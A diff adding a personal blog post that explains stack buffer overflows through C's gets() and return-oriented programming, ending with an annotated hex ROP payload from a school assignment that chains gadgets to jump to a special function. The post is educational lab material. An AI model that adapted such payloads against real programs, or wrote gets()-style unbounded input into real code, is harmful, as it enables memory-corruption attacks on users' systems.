@@ -4,5 +4,117 @@ title: Blog
 permalink: /blog/
 ---
 
-Blog here.
 
+# Hacking the stack using code injection and ROP 
+
+<text style="color : gray">February 9, 2024</text>
+
+Using C's `gets()` function can have serious cybersecurity risks.
+
+Say a function asks for a 16-byte string argument from a user: 
+
+```c
+int main() { 
+    char buf[16];
+    gets(buf);
+    return 0;
+}
+```
+
+Then, upon calling `gets(buf)`, the stack will look something like
+```
+higher addr's
+
+|      stack contents     |
+|-------------------------|
+|      stack contents     |
+|-------------------------|
+|      stack contents     |
+|-------------------------|
+|      buf bytes 0-7      |
+|-------------------------|
+|      buf bytes 8-15     |
+--------------------------- < top of stack
+```
+
+The issue with this is that `gets()` will keep reading and copying input from the input past 16 bytes allocated for `buf`.
+
+What happens then? 
+
+Lets use the following input bytes as an example: 
+
+```
+ff ff ff ff ff ff ff ff 
+ff ff ff ff ff ff ff ff 
+12 34 56
+```
+
+Then, the stack might look a bit like: 
+
+```
+|      stack contents     |
+|-------------------------|
+|      stack contents     |
+|-------------------------|
+| 12 34 56 k contents     |
+|-------------------------|
+| ff ff ff ff ff ff ff ff |
+|-------------------------|
+| ff ff ff ff ff ff ff ff |
+--------------------------- < top of stack
+```
+
+Even though we have filled buf, the program keeps loading in bytes 
+onto the stack until a terminating character is entered. Anything that was previously stored on the stack can get overwritten.
+
+What's stored on the stack? 
+
+Link Registers (saved addresses to return to after a subroutine)!
+
+This means that when we are inside a subroutine, somewhere on the stack there is a return address saved to jump back to once we exit the current subroutine.
+
+Thus, we can overwrite the address on the stack using `gets(buf)` and a carefully crafted user input. One example I had from a school assignment:
+
+```
+11 11 11 11 11 11 11 11 
+11 11 11 11 11 11 11 11 
+11 11 11 11 11 11 11 11 
+11 11 11 11 11 11 11 11 
+11 11 11 11 11 11 11 11 
+11 11 11 11 11 11 11 11 
+11 11 11 11 11 11 11 11 
+11 11 11 11 11 11 11 11 
+11 11 11 11 11 11 11 11 
+54 3e 45 00 00 00 00 00 // 0x453e54, address of gadget 1 (load x1) to load in read_file lr
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+80 9a 44 00 00 00 00 00 // 0x449a80, address of gadget 2 to load x0, placed in lr during gadget 1
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+90 ca f0 ff ff ff 00 00 // 0xfffffff0ca90, value of x1 (addr of ph33rm3n00bz)
+11 11 11 11 11 11 11 11
+e8 07 40 00 00 00 00 00 // 0x4007e8, addr of pwn3
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+3c 00 00 00 00 00 00 00  // 60, value to put in x0 in gadget 2
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+11 11 11 11 11 11 11 11
+70 68 33 33 72 6d 33 6e // ph33rm3n00bz, value to put in x1, placed near value of $sp when reaching pwn3 
+30 30 62 7a 00 00 00 00 
+``` 
+The above input was used to overwrite 3 link registers, overwrite 2 registers, and jump to a special function in the code.
